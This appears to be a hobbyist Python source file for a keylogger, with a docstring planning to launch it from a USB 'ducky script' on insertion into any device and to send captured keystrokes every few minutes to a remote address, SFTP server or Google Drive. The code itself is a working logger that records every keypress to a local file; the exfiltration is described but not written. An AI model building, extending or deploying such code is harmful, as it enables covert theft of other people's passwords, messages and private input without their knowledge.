"""
Kinda self explanatory, but a keylogger written in python. Gonna work on making a ducky script that does the exact same thing as this script. This is just kind of an experiment. 
- The ducky script will activate once the USB is inserted into whatever device. Then this script will run. The idea for the script is to either display the keystrokes in real-time or to send a file with the recorded strokes every 5 mins for example to a certain address.
- Can be made to upload to SFTP server or Google Drive API"""


# Imports
from pynput.keyboard import Listener

def on_press(key):
    with open('log.txt', 'a') as f:
        f.write(str(key)+'\n')

with Listener(on_press=on_press) as listener:
    listener.join()